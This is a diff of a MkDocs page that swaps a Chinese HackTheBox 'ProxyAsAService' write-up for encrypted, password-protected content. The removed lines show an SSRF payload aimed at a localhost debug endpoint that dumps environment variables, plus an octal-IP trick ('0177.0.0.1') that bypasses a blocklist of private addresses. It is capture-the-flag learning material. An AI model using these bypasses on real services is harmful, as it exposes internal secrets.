@@ -8,6 +8,8 @@
       
       
       
+        <link rel="canonical" href="https://Zer0-hex.github.io/write-up/HackTheBox/Challenges/Web/Easy-ProxyAsAService/">
+      
       
         <link rel="prev" href="../../Crypto/VeryEasy-BabyEncryption/">
       
@@ -20,7 +22,7 @@
     
     
       
-        <title>Easy-ProxyAsAService - Write-up</title>
+        <title>[Protected] Easy-ProxyAsAService - Write-up</title>
       
     
     
@@ -95,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Easy-ProxyAsAService
+              [Protected] Easy-ProxyAsAService
             
           </span>
         </div>
@@ -144,6 +146,18 @@
   </div>
 </div>
     
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+      </div>
     
   </nav>
   
@@ -227,6 +241,18 @@
     </a>
     Write-up
   </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Zer0-hex/Zer0-hex.github.io" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    Zer0-hex/Zer0-hex.github.io
+  </div>
+</a>
+    </div>
   
   <ul class="md-nav__list" data-md-scrollfix>
     
@@ -402,7 +428,7 @@
         
   
   <span class="md-ellipsis">
-    Very Easy - BabyEncryption
+    [Protected] Very Easy - BabyEncryption
   </span>
   
 
@@ -479,7 +505,7 @@
           
   
   <span class="md-ellipsis">
-    Easy-ProxyAsAService
+    [Protected] Easy-ProxyAsAService
   </span>
   
 
@@ -490,7 +516,7 @@
         
   
   <span class="md-ellipsis">
-    Easy-ProxyAsAService
+    [Protected] Easy-ProxyAsAService
   </span>
   
 
@@ -867,109 +893,38 @@
                 
                   
 
+  
+  
 
-<h1 id="easy-proxyasaservice">Easy-ProxyAsAService</h1>
-<blockquote>
-<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p>
-<p>ProxyAsAService.zip</p>
-<ul>
-<li>web_proxyasaservice</li>
-<li>challenge/<ul>
-<li>application/</li>
-<li>blueprints/<ul>
-<li>routes.py</li>
-</ul>
-</li>
-<li>app.py</li>
-<li>config.py</li>
-<li>util.py</li>
-<li>run.py</li>
-</ul>
-</li>
-<li>config/<ul>
-<li>supervisord.conf</li>
-</ul>
-</li>
-<li>build-docker.sh</li>
-<li>Dockerfile</li>
-</ul>
-</blockquote>
-<p>简单过一下代码，是一个 Python flask 框架的 HTTP 代理</p>
-<h3 id="routespy">routes.py</h3>
-<ul>
-<li>flag 获取方法</li>
-</ul>
-<div class="language-python highlight"><pre><span></span><code><span class="nd">@debug</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/environment&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
-<span class="nd">@is_from_localhost</span>
-<span class="k">def</span> <span class="nf">debug_environment</span><span class="p">():</span>
-    <span class="n">environment_info</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="s1">&#39;Environment variables&#39;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">),</span>
-        <span class="s1">&#39;Request headers&#39;</span><span class="p">:</span> <span class="nb">dict</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="p">)</span>
-    <span class="p">}</span>
 
-    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">environment_info</span><span class="p">)</span>
-</code></pre></div>
-<p>可以看到获取 flag 的方式为本地访问 <code>http://127.0.0.1/debug/environment</code></p>
-<ul>
-<li>有漏洞的路由</li>
-</ul>
-<div class="language-python highlight"><pre><span></span><code><span class="n">SITE_NAME</span> <span class="o">=</span> <span class="s1">&#39;reddit.com&#39;</span>
+<div id="mkdocs-encrypted-content" style="display:none">UDlf1vIIAHJ3GUFQeV2eKw==;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</div>
+<div id="mkdocs-decrypted-content">
+    <form id="mkdocs-decrypt-form" class="md-content__inner md-typeset">
+        <h1>This content is protected with AES encryption. </h1>
+        <p>Contact your administrator for access to this page.</p>
+        <input class="md-input" type="password" id="mkdocs-content-password" placeholder="Password" />
+        
+        <p id="mkdocs-decrypt-msg"></p>
+    </form>
+</div>
 
-<span class="nd">@proxy_api</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
-<span class="k">def</span> <span class="nf">proxy</span><span class="p">():</span>
-    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
-    <span class="o">...</span>
-    <span class="n">target_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">SITE_NAME</span><span class="si">}{</span><span class="n">url</span><span class="si">}</span><span class="s1">&#39;</span>
-    <span class="n">response</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">proxy_req</span><span class="p">(</span><span class="n">target_url</span><span class="p">)</span>
-</code></pre></div>
-<p>获取 url 参数，拼接成<code>https://reddit.com{url}</code> 传给 proxy_req</p>
-<h3 id="utilpy">util.py</h3>
-<ul>
-<li>代理请求</li>
-</ul>
-<div class="language-python3 highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">proxy_req</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-    <span class="o">...</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">request</span><span class="p">(</span>
-        <span class="n">method</span><span class="p">,</span>
-        <span class="n">url</span><span class="p">,</span>
-        <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
-        <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span>
-        <span class="n">verify</span><span class="o">=</span><span class="kc">False</span>
-    <span class="p">)</span>
-    <span class="o">...</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe_url</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">is_safe_url</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="p">):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+]&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
-        <span class="k">return</span> <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">response</span><span class="p">,</span> <span class="n">headers</span>
-</code></pre></div>
-<p>proxy_req 函数请求 url，因此可以构造 SSRF</p>
-<div class="language-text highlight"><pre><span></span><code>url = @127.0.0.1:1337/debug/environment
-</code></pre></div>
-<p><img alt="image-20231025161221088" src="https://cdn.jsdelivr.net/gh/zer0-hex/image-hosting@main/typora/202310251612138.png" /></p>
-<p>发现被过滤了</p>
-<ul>
-<li>过滤函数</li>
-</ul>
-<div class="language-python3 highlight"><pre><span></span><code><span class="n">RESTRICTED_URLS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;127.&#39;</span><span class="p">,</span> <span class="s1">&#39;192.168.&#39;</span><span class="p">,</span> <span class="s1">&#39;10.&#39;</span><span class="p">,</span> <span class="s1">&#39;172.&#39;</span><span class="p">]</span>
-<span class="k">def</span> <span class="nf">is_safe_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
-    <span class="k">for</span> <span class="n">restricted_url</span> <span class="ow">in</span> <span class="n">RESTRICTED_URLS</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">restricted_url</span> <span class="ow">in</span> <span class="n">url</span><span class="p">:</span>
-            <span class="k">return</span> <span class="kc">False</span>
-    <span class="k">return</span> <span class="kc">True</span>
-</code></pre></div>
-<p>尝试绕过，发现 8 进制可以</p>
-<div class="language-text highlight"><pre><span></span><code>url = @0177.0.0.1:1337/debug/environment
